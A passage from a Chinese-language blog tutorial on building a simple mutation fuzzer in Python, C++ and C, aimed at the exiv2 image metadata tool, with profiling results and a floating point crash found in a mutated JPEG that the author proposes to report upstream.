fuzzer</code>，去尝试一个新的目标吧!</p><h2 id="Selecting-a-New-Victim"><a href="#Selecting-a-New-Victim" class="headerlink" title="Selecting a New Victim"></a>Selecting a New Victim</h2><p>看一下<code>Kali Linux</code>上预装的东西，因为这是我们的操作环境，让我们看一下<code>exiv2</code>，它是在<code>/usr/bin/exiv2</code>中被找到。</p><pre><code class="hljs sql">root@kali:~<span class="hljs-comment"># exiv2 -h</span>Usage: exiv2 [ options ] [ action ] file ...Manipulate the Exif metadata of images.Actions:  ad | adjust   Adjust Exif timestamps by the given time. This action                requires at least one of the -a, -Y, -O or -D options.  pr | print    Print image metadata.  rm | <span class="hljs-keyword">delete</span>   <span class="hljs-keyword">Delete</span> image metadata <span class="hljs-keyword">from</span> the files.  <span class="hljs-keyword">in</span> | <span class="hljs-keyword">insert</span>   <span class="hljs-keyword">Insert</span> metadata <span class="hljs-keyword">from</span> <span class="hljs-keyword">corresponding</span> *.exv files.                <span class="hljs-keyword">Use</span> <span class="hljs-keyword">option</span> -S <span class="hljs-keyword">to</span> <span class="hljs-keyword">change</span> the suffix <span class="hljs-keyword">of</span> the <span class="hljs-keyword">input</span> files.  ex | <span class="hljs-keyword">extract</span>  <span class="hljs-keyword">Extract</span> metadata <span class="hljs-keyword">to</span> *.exv, *.xmp <span class="hljs-keyword">and</span> thumbnail image files.  mv | <span class="hljs-keyword">rename</span>   <span class="hljs-keyword">Rename</span> files <span class="hljs-keyword">and</span>/<span class="hljs-keyword">or</span> <span class="hljs-keyword">set</span> <span class="hljs-keyword">file</span> timestamps according <span class="hljs-keyword">to</span> the                Exif <span class="hljs-keyword">create</span> timestamp. The filename <span class="hljs-keyword">format</span> can be <span class="hljs-keyword">set</span> <span class="hljs-keyword">with</span>                -r <span class="hljs-keyword">format</span>, <span class="hljs-built_in">timestamp</span> options <span class="hljs-keyword">are</span> controlled <span class="hljs-keyword">with</span> -t <span class="hljs-keyword">and</span> -T.  mo | <span class="hljs-keyword">modify</span>   <span class="hljs-keyword">Apply</span> commands <span class="hljs-keyword">to</span> <span class="hljs-keyword">modify</span> (<span class="hljs-keyword">add</span>, <span class="hljs-keyword">set</span>, <span class="hljs-keyword">delete</span>) the Exif <span class="hljs-keyword">and</span>                IPTC metadata <span class="hljs-keyword">of</span> image files <span class="hljs-keyword">or</span> <span class="hljs-keyword">set</span> the JPEG comment.                Requires <span class="hljs-keyword">option</span> -c, -m <span class="hljs-keyword">or</span> -M.  fi | fixiso   Copy ISO setting <span class="hljs-keyword">from</span> the Nikon Makernote <span class="hljs-keyword">to</span> the regular                Exif tag.  fc | fixcom   <span class="hljs-keyword">Convert</span> the <span class="hljs-keyword">UNICODE</span> Exif <span class="hljs-keyword">user</span> <span class="hljs-keyword">comment</span> <span class="hljs-keyword">to</span> UCS<span class="hljs-number">-2.</span> Its <span class="hljs-keyword">current</span>                <span class="hljs-built_in">character</span> <span class="hljs-keyword">encoding</span> can be specified <span class="hljs-keyword">with</span> the -n option.Options:   -h      Display this <span class="hljs-keyword">help</span> <span class="hljs-keyword">and</span> exit.   -V      <span class="hljs-keyword">Show</span> the program <span class="hljs-keyword">version</span> <span class="hljs-keyword">and</span> exit.   -v      Be verbose during the program run.   -q      Silence <span class="hljs-keyword">warnings</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">error</span> messages during the program run (quiet).   -Q lvl  <span class="hljs-keyword">Set</span> <span class="hljs-keyword">log</span>-<span class="hljs-keyword">level</span> <span class="hljs-keyword">to</span> d(ebug), i(nfo), w(arning), e(rror) <span class="hljs-keyword">or</span> m(ute).   -b      <span class="hljs-keyword">Show</span> <span class="hljs-keyword">large</span> <span class="hljs-built_in">binary</span> values.   -u      <span class="hljs-keyword">Show</span> <span class="hljs-literal">unknown</span> tags.   -g <span class="hljs-keyword">key</span>  <span class="hljs-keyword">Only</span> <span class="hljs-keyword">output</span> info <span class="hljs-keyword">for</span> this <span class="hljs-keyword">key</span> (grep).   -K <span class="hljs-keyword">key</span>  <span class="hljs-keyword">Only</span> <span class="hljs-keyword">output</span> info <span class="hljs-keyword">for</span> this <span class="hljs-keyword">key</span> (exact <span class="hljs-keyword">match</span>).   -n enc  <span class="hljs-keyword">Charset</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">use</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">decode</span> <span class="hljs-keyword">UNICODE</span> Exif <span class="hljs-keyword">user</span> comments.   -k      <span class="hljs-keyword">Preserve</span> <span class="hljs-keyword">file</span> timestamps (<span class="hljs-keyword">keep</span>).   -t      Also <span class="hljs-keyword">set</span> the <span class="hljs-keyword">file</span> <span class="hljs-built_in">timestamp</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;rename&#x27;</span> <span class="hljs-keyword">action</span> (overrides -k).   -T      <span class="hljs-keyword">Only</span> <span class="hljs-keyword">set</span> the <span class="hljs-keyword">file</span> <span class="hljs-built_in">timestamp</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;rename&#x27;</span> <span class="hljs-keyword">action</span>, <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">rename</span>           the <span class="hljs-keyword">file</span> (overrides -k).   -f      <span class="hljs-keyword">Do</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">prompt</span> <span class="hljs-keyword">before</span> overwriting existing files (<span class="hljs-keyword">force</span>).   -F      <span class="hljs-keyword">Do</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">prompt</span> <span class="hljs-keyword">before</span> renaming files (<span class="hljs-keyword">Force</span>).   -a <span class="hljs-built_in">time</span> <span class="hljs-built_in">Time</span> adjustment <span class="hljs-keyword">in</span> the <span class="hljs-keyword">format</span> [-]HH[:MM[:SS]]. This <span class="hljs-keyword">option</span>           <span class="hljs-keyword">is</span> <span class="hljs-keyword">only</span> used <span class="hljs-keyword">with</span> the <span class="hljs-string">&#x27;adjust&#x27;</span> action.   -Y yrs  <span class="hljs-keyword">Year</span> adjustment <span class="hljs-keyword">with</span> the <span class="hljs-string">&#x27;adjust&#x27;</span> action.   -O mon  <span class="hljs-keyword">Month</span> adjustment <span class="hljs-keyword">with</span> the <span class="hljs-string">&#x27;adjust&#x27;</span> action.   -D <span class="hljs-keyword">day</span>  <span class="hljs-keyword">Day</span> adjustment <span class="hljs-keyword">with</span> the <span class="hljs-string">&#x27;adjust&#x27;</span> action.   -p <span class="hljs-keyword">mode</span> Print <span class="hljs-keyword">mode</span> <span class="hljs-keyword">for</span> the <span class="hljs-string">&#x27;print&#x27;</span> action. Possible modes <span class="hljs-keyword">are</span>:             s : print a summary <span class="hljs-keyword">of</span> the Exif metadata (the <span class="hljs-keyword">default</span>)             a : print Exif, IPTC <span class="hljs-keyword">and</span> XMP metadata (shortcut <span class="hljs-keyword">for</span> -Pkyct)             t : interpreted (translated) Exif <span class="hljs-keyword">data</span> (-PEkyct)             v : plain Exif <span class="hljs-keyword">data</span> <span class="hljs-keyword">values</span> (-PExgnycv)             h : hexdump <span class="hljs-keyword">of</span> the Exif <span class="hljs-keyword">data</span> (-PExgnycsh)             i : IPTC <span class="hljs-keyword">data</span> <span class="hljs-keyword">values</span> (-PIkyct)             x : XMP properties (-PXkyct)             c : JPEG <span class="hljs-keyword">comment</span>             p : <span class="hljs-keyword">list</span> available previews             S : print structure <span class="hljs-keyword">of</span> image             X : <span class="hljs-keyword">extract</span> XMP <span class="hljs-keyword">from</span> image   -P flgs Print flags <span class="hljs-keyword">for</span> fine control <span class="hljs-keyword">of</span> tag lists (<span class="hljs-string">&#x27;print&#x27;</span> <span class="hljs-keyword">action</span>):             E : <span class="hljs-keyword">include</span> Exif tags <span class="hljs-keyword">in</span> the <span class="hljs-keyword">list</span>             I : IPTC datasets             X : XMP properties             x : print a <span class="hljs-keyword">column</span> <span class="hljs-keyword">with</span> the tag <span class="hljs-built_in">number</span>             g : <span class="hljs-keyword">group</span> <span class="hljs-keyword">name</span>             k : <span class="hljs-keyword">key</span>             l : tag label             n : tag <span class="hljs-keyword">name</span>             y : <span class="hljs-keyword">type</span>             c : <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> components (<span class="hljs-keyword">count</span>)             s : <span class="hljs-keyword">size</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">bytes</span>             v : plain <span class="hljs-keyword">data</span> <span class="hljs-keyword">value</span>             t : interpreted (translated) <span class="hljs-keyword">data</span>             h : hexdump <span class="hljs-keyword">of</span> the <span class="hljs-keyword">data</span>   -d tgt  <span class="hljs-keyword">Delete</span> target(s) <span class="hljs-keyword">for</span> the <span class="hljs-string">&#x27;delete&#x27;</span> action. Possible targets <span class="hljs-keyword">are</span>:             a : <span class="hljs-keyword">all</span> supported metadata (the <span class="hljs-keyword">default</span>)             e : Exif <span class="hljs-keyword">section</span>             t : Exif thumbnail <span class="hljs-keyword">only</span>             i : IPTC <span class="hljs-keyword">data</span>             x : XMP packet             c : JPEG <span class="hljs-keyword">comment</span>   -i tgt  <span class="hljs-keyword">Insert</span> target(s) <span class="hljs-keyword">for</span> the <span class="hljs-string">&#x27;insert&#x27;</span> action. Possible targets <span class="hljs-keyword">are</span>           the same <span class="hljs-keyword">as</span> those <span class="hljs-keyword">for</span> the -d <span class="hljs-keyword">option</span>, plus a modifier:             X : <span class="hljs-keyword">Insert</span> metadata <span class="hljs-keyword">from</span> an XMP sidecar <span class="hljs-keyword">file</span> &lt;<span class="hljs-keyword">file</span>&gt;.xmp           <span class="hljs-keyword">Only</span> JPEG thumbnails can be inserted, they need <span class="hljs-keyword">to</span> be named           &lt;<span class="hljs-keyword">file</span>&gt;-thumb.jpg   -e tgt  <span class="hljs-keyword">Extract</span> target(s) <span class="hljs-keyword">for</span> the <span class="hljs-string">&#x27;extract&#x27;</span> action. Possible targets           <span class="hljs-keyword">are</span> the same <span class="hljs-keyword">as</span> those <span class="hljs-keyword">for</span> the -d <span class="hljs-keyword">option</span>, plus a target <span class="hljs-keyword">to</span> <span class="hljs-keyword">extract</span>           preview images <span class="hljs-keyword">and</span> a modifier <span class="hljs-keyword">to</span> generate an XMP sidecar <span class="hljs-keyword">file</span>:             p[&lt;n&gt;[,&lt;m&gt; ...]] : <span class="hljs-keyword">Extract</span> preview images.             X : <span class="hljs-keyword">Extract</span> metadata <span class="hljs-keyword">to</span> an XMP sidecar <span class="hljs-keyword">file</span> &lt;<span class="hljs-keyword">file</span>&gt;.xmp   -r fmt  Filename <span class="hljs-keyword">format</span> <span class="hljs-keyword">for</span> the <span class="hljs-string">&#x27;rename&#x27;</span> action. The <span class="hljs-keyword">format</span> <span class="hljs-keyword">string</span>           <span class="hljs-keyword">follows</span> strftime(<span class="hljs-number">3</span>). The <span class="hljs-keyword">following</span> keywords <span class="hljs-keyword">are</span> supported:             :basename:   - original filename <span class="hljs-keyword">without</span> extension             :dirname:    - <span class="hljs-keyword">name</span> <span class="hljs-keyword">of</span> the <span class="hljs-keyword">directory</span> holding the original <span class="hljs-keyword">file</span>             :parentname: - <span class="hljs-keyword">name</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">parent</span> <span class="hljs-keyword">directory</span>           <span class="hljs-keyword">Default</span> filename <span class="hljs-keyword">format</span> <span class="hljs-keyword">is</span> %Y%m%d_%H%M%S.   -c txt  JPEG <span class="hljs-keyword">comment</span> <span class="hljs-keyword">string</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">set</span> <span class="hljs-keyword">in</span> the image.   -m <span class="hljs-keyword">file</span> Command <span class="hljs-keyword">file</span> <span class="hljs-keyword">for</span> the <span class="hljs-keyword">modify</span> action. The <span class="hljs-keyword">format</span> <span class="hljs-keyword">for</span> commands <span class="hljs-keyword">is</span>           <span class="hljs-keyword">set</span>|<span class="hljs-keyword">add</span>|del &lt;<span class="hljs-keyword">key</span>&gt; [[&lt;<span class="hljs-keyword">type</span>&gt;] &lt;<span class="hljs-keyword">value</span>&gt;].   -M cmd  Command line <span class="hljs-keyword">for</span> the <span class="hljs-keyword">modify</span> action. The <span class="hljs-keyword">format</span> <span class="hljs-keyword">for</span> the           commands <span class="hljs-keyword">is</span> the same <span class="hljs-keyword">as</span> that <span class="hljs-keyword">of</span> the <span class="hljs-keyword">lines</span> <span class="hljs-keyword">of</span> a command file.   -l dir  Location (<span class="hljs-keyword">directory</span>) <span class="hljs-keyword">for</span> files <span class="hljs-keyword">to</span> be inserted <span class="hljs-keyword">from</span> <span class="hljs-keyword">or</span> extracted to.   -S .suf <span class="hljs-keyword">Use</span> suffix .suf <span class="hljs-keyword">for</span> <span class="hljs-keyword">source</span> files <span class="hljs-keyword">for</span> <span class="hljs-keyword">insert</span> command.</code></pre><p>看一下帮助指南，让我们继续随机地尝试一下用于<code>Print image metadata</code>的<code>pr</code>和用于<code>Be verbose during the program run</code>的<code>-v</code>指令，你可以从这个帮助指南中看到这里有大量的攻击面供我们探索，但现在让我们把事情简单化。</p><p>现在在我们<code>fuzzer</code>中的命令行指令字符将是这样的：<code>exiv2 pr -v mutated.jpg</code></p><p>我们继续更新我们的<code>fuzzer</code>，看看我们是否能在一个更难的目标上找到<code>bug</code>，值得一提的是，这个目标是受支持的，而不像我们上一个目标，去找一个微不足道的二进制的<code>bugs</code>（<code>Github</code>上不再被支持的7年已久的项目）</p><p>这个目标已经被更高级的<code>fuzzer</code>进行模糊测试过了，你可以简单地通过谷歌<code>ASan exiv2</code>搜素之类地东西，并获得大量的<code>fuzzer</code>在二进制文件上创建的<code>segfaults</code>，并转发<code>ASan</code>输出到<code>github</code>仓库作为一个<code>bug</code>，这是我们上一个目标的重要一步。</p><p><a href="https://github.com/Exiv2/exiv2">exiv2 on Github</a></p><p><a href="https://www.exiv2.org/">exiv2 Website</a></p><h2 id="Fuzzing-Our-New-Target"><a href="#Fuzzing-Our-New-Target" class="headerlink" title="Fuzzing Our New Target"></a>Fuzzing Our New Target</h2><p>让我们从我们新的和改进的<code>Python fuzzer</code>开始，监测它在<code>50k</code>次迭代中的性能，让我们添加一些代码，除了我们的<code>Segmentation fault detection</code>外，还监测<code>Floating point exceptions</code>（称之为赌怪！），我们的新<code>exif()</code>函数将看起来像这样：</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exif</span>(<span class="hljs-params">counter,data</span>):</span>    p = Popen([<span class="hljs-string">&quot;exiv2&quot;</span>, <span class="hljs-string">&quot;pr&quot;</span>, <span class="hljs-string">&quot;-v&quot;</span>, <span class="hljs-string">&quot;mutated.jpg&quot;</span>], stdout=PIPE, stderr=PIPE)    (out,err) = p.communicate()    <span class="hljs-keyword">if</span> p.returncode == <span class="hljs-number">-11</span>:        f = open(<span class="hljs-string">&quot;crashes2/crash.&#123;&#125;.jpg&quot;</span>.format(str(counter)), <span class="hljs-string">&quot;ab+&quot;</span>)        f.write(data)        print(<span class="hljs-string">&quot;Segfault!&quot;</span>)    <span class="hljs-keyword">elif</span> p.returncode == <span class="hljs-number">-8</span>:        f = open(<span class="hljs-string">&quot;crashes2/crash.&#123;&#125;.jpg&quot;</span>.format(str(counter)), <span class="hljs-string">&quot;ab+&quot;</span>)        f.write(data)        print(<span class="hljs-string">&quot;Floating Point!&quot;</span>)</code></pre><p>我们来看看<code>python3 -m cProfile -s cumtime subpro.py ~/jpegs/Canon_40D.jpg</code>的输出：</p><pre><code class="hljs yaml"><span class="hljs-number">75780446</span> <span class="hljs-string">function</span> <span class="hljs-string">calls</span> <span class="hljs-string">(75780309</span> <span class="hljs-string">primitive</span> <span class="hljs-string">calls)</span> <span class="hljs-string">in</span> <span class="hljs-number">213.595</span> <span class="hljs-string">seconds</span>   <span class="hljs-attr">Ordered by:</span> <span class="hljs-string">cumulative</span> <span class="hljs-string">time</span>   <span class="hljs-string">ncalls</span>  <span class="hljs-string">tottime</span>  <span class="hljs-string">percall</span>  <span class="hljs-string">cumtime</span>  <span class="hljs-string">percall</span> <span class="hljs-string">filename:lineno(function)</span>     <span class="hljs-number">15</span><span class="hljs-string">/1</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">0.000</span>  <span class="hljs-number">213.595</span>  <span class="hljs-number">213.595</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">builtins.exec</span>&#125;        <span class="hljs-number">1</span>    <span class="hljs-number">1.481</span>    <span class="hljs-number">1.481</span>  <span class="hljs-number">213.595</span>  <span class="hljs-number">213.595</span> <span class="hljs-string">subpro.py:3(&lt;module&gt;)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">0.818</span>    <span class="hljs-number">0.000</span>  <span class="hljs-number">187.205</span>    <span class="hljs-number">0.004</span> <span class="hljs-string">subpro.py:111(exif)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">0.543</span>    <span class="hljs-number">0.000</span>  <span class="hljs-number">143.499</span>    <span class="hljs-number">0.003</span> <span class="hljs-string">subprocess.py:920(communicate)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">6.773</span>    <span class="hljs-number">0.000</span>  <span class="hljs-number">142.873</span>    <span class="hljs-number">0.003</span> <span class="hljs-string">subprocess.py:1662(_communicate)</span>  <span class="hljs-number">1641352</span>    <span class="hljs-number">3.186</span>    <span class="hljs-number">0.000</span>  <span class="hljs-number">122.668</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">selectors.py:402(select)</span>  <span class="hljs-number">1641352</span>  <span class="hljs-number">118.799</span>    <span class="hljs-number">0.000</span>  <span class="hljs-number">118.799</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">method</span> <span class="hljs-string">&#x27;poll&#x27;</span> <span class="hljs-string">of</span> <span class="hljs-string">&#x27;select.poll&#x27;</span> <span class="hljs-string">objects</span>&#125;    <span class="hljs-number">50000</span>    <span class="hljs-number">1.220</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">42.888</span>    <span class="hljs-number">0.001</span> <span class="hljs-string">subprocess.py:681(__init__)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">4.400</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">39.364</span>    <span class="hljs-number">0.001</span> <span class="hljs-string">subprocess.py:1412(_execute_child)</span>  <span class="hljs-number">1691919</span>   <span class="hljs-number">25.759</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">25.759</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">posix.read</span>&#125;    <span class="hljs-number">50000</span>    <span class="hljs-number">3.863</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">13.938</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subpro.py:14(bit_flip)</span>  <span class="hljs-number">7950000</span>    <span class="hljs-number">3.587</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">9.991</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">random.py:256(choice)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">7.495</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">7.495</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">_posixsubprocess.fork_exec</span>&#125;    <span class="hljs-number">50000</span>    <span class="hljs-number">0.148</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">7.081</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subpro.py:105(create_new)</span>  <span class="hljs-number">7950000</span>    <span class="hljs-number">3.884</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">5.764</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">random.py:224(_randbelow)</span>   <span class="hljs-number">200000</span>    <span class="hljs-number">4.582</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">4.582</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">io.open</span>&#125;    <span class="hljs-number">50000</span>    <span class="hljs-number">4.192</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">4.192</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">method</span> <span class="hljs-string">&#x27;close&#x27;</span> <span class="hljs-string">of</span> <span class="hljs-string">&#x27;_io.BufferedRandom&#x27;</span> <span class="hljs-string">objects</span>&#125;    <span class="hljs-number">50000</span>    <span class="hljs-number">1.339</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">3.612</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">os.py:617(get_exec_path)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">1.641</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">3.309</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subpro.py:8(get_bytes)</span>   <span class="hljs-number">100000</span>    <span class="hljs-number">0.077</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.822</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subprocess.py:1014(wait)</span>   <span class="hljs-number">100000</span>    <span class="hljs-number">0.432</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.746</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subprocess.py:1621(_wait)</span>   <span class="hljs-number">100000</span>    <span class="hljs-number">0.256</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.735</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">selectors.py:351(register)</span>   <span class="hljs-number">100000</span>    <span class="hljs-number">0.619</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.422</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">selectors.py:234(register)</span>   <span class="hljs-number">350000</span>    <span class="hljs-number">0.380</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.402</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subprocess.py:1471(&lt;genexpr&gt;)</span> <span class="hljs-number">12066004</span>    <span class="hljs-number">1.335</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.335</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">method</span> <span class="hljs-string">&#x27;getrandbits&#x27;</span> <span class="hljs-string">of</span> <span class="hljs-string">&#x27;_random.Random&#x27;</span> <span class="hljs-string">objects</span>&#125;    <span class="hljs-number">50000</span>    <span class="hljs-number">0.063</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.222</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subprocess.py:1608(_try_wait)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">1.160</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.160</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">posix.waitpid</span>&#125;   <span class="hljs-number">100000</span>    <span class="hljs-number">0.519</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.143</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">os.py:674(__getitem__)</span>  <span class="hljs-number">1691352</span>    <span class="hljs-number">0.902</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.097</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">selectors.py:66(__len__)</span>  <span class="hljs-number">7234121</span>    <span class="hljs-number">1.023</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.023</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">method</span> <span class="hljs-string">&#x27;append&#x27;</span> <span class="hljs-string">of</span> <span class="hljs-string">&#x27;list&#x27;</span> <span class="hljs-string">objects</span>&#125;<span class="hljs-string">-----SNIP-----</span></code></pre><p>看起来我们总共花了<code>213s</code>，但并没有真正发现任何<code>bug</code>，这很遗憾，但可能只是运气原因，让我们在同样的情况下运行我们的<code>C++ fuzzer</code>，并监测其输出。</p><p>在这里，我们得到了一个差不多的时间，但有很大的提升。</p><pre><code class="hljs angelscript"><span class="hljs-symbol">root@</span>kali:~# ./blogcpp ~/jpegs/Canon_40D.jpg <span class="hljs-number">50000</span>Execution Time: <span class="hljs-number">170829</span>ms</code></pre><p>这是一个相当大的提升，43秒，这缩短了我们的<code>Python fuzzer</code>20%的时间</p><p>让我们继续跑一段时间的<code>C++ fuzzer</code>，看看是否我们能找到任何<code>bugs</code> :)</p><h2 id="Bugs-on-Our-New-Target"><a href="#Bugs-on-Our-New-Target" class="headerlink" title="Bugs on Our New Target!"></a>Bugs on Our New Target!</h2><p>在再次运行<code>fuzzer</code>大约<code>10s</code>后，我得到了以下这个终端输出：</p><pre><code class="hljs elixir">root<span class="hljs-variable">@kali</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># ./blogcpp ~/jpegs/Canon_40D.jpg 1000000</span>Floating Point!</code></pre><p>这似乎我们满足了<code>a Floating Point exception</code>的需求</p><p>我们应该有一个很棒的<code>jpg</code>在<code>cppcrashes</code>文件夹中等着我们</p><pre><code class="hljs elixir">root<span class="hljs-variable">@kali</span><span class="hljs-symbol">:~/cppcrashes</span><span class="hljs-comment"># ls</span>crash.<span class="hljs-number">522</span>.jpg</code></pre><p>让我们通过对这个样本运行<code>exiv2</code>来证实这个错误。</p><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@kali:~/cppcrashes# exiv<span class="hljs-number">2</span> pr -v crash.<span class="hljs-number">522</span>.jpg<span class="hljs-attribute">File</span> <span class="hljs-number">1</span>/<span class="hljs-number">1</span>: crash.<span class="hljs-number">522</span>.jpg<span class="hljs-attribute">Error</span>: Offset of directory Image, entry <span class="hljs-number">0</span>x<span class="hljs-number">011</span>b is out of bounds: Offset = <span class="hljs-number">0</span>x<span class="hljs-number">080000</span>ae; truncating the entry<span class="hljs-attribute">Warning</span>: Directory Image, entry <span class="hljs-number">0</span>x<span class="hljs-number">8825</span> has unknown Exif (TIFF) type <span class="hljs-number">68</span>; setting type size <span class="hljs-number">1</span>.<span class="hljs-attribute">Warning</span>: Directory Image, entry <span class="hljs-number">0</span>x<span class="hljs-number">8825</span> doesn&#x27;t look like a sub-IFD.<span class="hljs-attribute">File</span> name       : crash.<span class="hljs-number">522</span>.jpg<span class="hljs-attribute">File</span> size       : <span class="hljs-number">7958</span> Bytes<span class="hljs-attribute">MIME</span> type       : image/jpeg<span class="hljs-attribute">Image</span> size      : <span class="hljs-number">100</span> x <span class="hljs-number">68</span><span class="hljs-attribute">Camera</span> make     : Aanon<span class="hljs-attribute">Camera</span> model    : Canon EOS <span class="hljs-number">40</span>D<span class="hljs-attribute">Image</span> timestamp : <span class="hljs-number">2008</span>:<span class="hljs-number">05</span>:<span class="hljs-number">30</span> <span class="hljs-number">15</span>:<span class="hljs-number">56</span>:<span class="hljs-number">01</span><span class="hljs-attribute">Image</span> number    : <span class="hljs-attribute">Exposure</span> time   : <span class="hljs-number">1</span>/<span class="hljs-number">160</span> s<span class="hljs-attribute">Aperture</span>        : F<span class="hljs-number">7</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Floating</span> point exception</code></pre><p>我们确实发现了一个新的<code>bug</code>! 这实在是太令人兴奋了，我们应该向<code>Github</code>上的<code>exiv2</code>开发者发布一份<code>bug report</code></p><p>为了找点有趣的，让我们比较一下我们的原始<code>fuzzer</code>在50,000次迭代中的表现：</p><pre><code class="hljs basic"><span class="hljs-symbol">123052109 </span>function <span class="hljs-keyword">calls</span> (<span class="hljs-number">123001828</span> primitive <span class="hljs-keyword">calls</span>) in <span class="hljs-number">6243.939</span> seconds</code></pre><p>正如你所看到的，<code>6243s</code>明显比我们的<code>C++ fuzzer</code>基准的<code>170s</code>慢</p><h2 id="Addendum-15-May-2020"><a href="#Addendum-15-May-2020" class="headerlink" title="Addendum 15/May/2020"></a>Addendum 15/May/2020</h2><p>仅试试通过移植<code>C++ fuzzer</code>到<code>C</code>上，我自己也做了一些适当的改进，其中一个我所修改的逻辑为仅从原始有效的图像中收集一次数据，然后在每次<code>fuzzing</code>迭代把数据复制到新分配的缓冲区，之后再在新分配的缓冲区中执行变异操作，这个与<code>C++ fuzzer</code>基本相同的<code>C</code>版本比<code>C++</code>执行的效果更好，这是这两个迭代<code>200k</code>次之间的对比（你可以忽略这个<code>crash</code>的发现数，因为这个<code>fuzzer</code>是相当愚蠢且100%随机的）：</p><pre><code class="hljs apache"><span class="hljs-attribute">h0mbre</span>:~$ time ./cppfuzz Canon_<span class="hljs-number">40</span>D.jpg <span class="hljs-number">200000</span><span class="hljs-section">&lt;snipped_results&gt;</span><span class="hljs-attribute">real</span>    <span class="hljs-number">10</span>m<span class="hljs-number">45</span>.<span class="hljs-number">371</span>s<span class="hljs-attribute">user</span>    <span class="hljs-number">7</span>m<span class="hljs-number">14</span>.<span class="hljs-number">561</span>s<span class="hljs-attribute">sys</span>     <span class="hljs-number">3</span>m<span class="hljs-number">10</span>.<span class="hljs-number">529</span>s<span class="hljs-attribute">h0mbre</span>:~$ time ./cfuzz Canon_<span class="hljs-number">40</span>D.jpg <span class="hljs-number">200000</span><span class="hljs-section">&lt;snipped_results&gt;</span><span class="hljs-attribute">real</span>    <span class="hljs-number">10</span>m<span class="hljs-number">7</span>.<span class="hljs-number">686</span>s<span class="hljs-attribute">user</span>    <span class="hljs-number">7</span>m<span class="hljs-number">27</span>.<span class="hljs-number">503</span>s<span class="hljs-attribute">sys</span>     <span class="hljs-number">2</span>m<span class="hljs-number">20</span>.<span class="hljs-number">843</span>s</code></pre><p>因此，在超过<code>200k</code>次的迭代中，我们以节省<code>35-40s</code>结束改进，这个在我们的测试中是十分典型的，因此，仅仅通过少量的逻辑更改和使用较少的<code>C++</code>提供的抽象接口中，我们节省了大量的<code>sys</code>的时间，我们的速度大概提升了<code>5%</code></p><h3 id="Monitoring-Child-Process-Exit-Status"><a href="#Monitoring-Child-Process-Exit-Status" class="headerlink" title="Monitoring Child Process Exit Status"></a>Monitoring Child Process 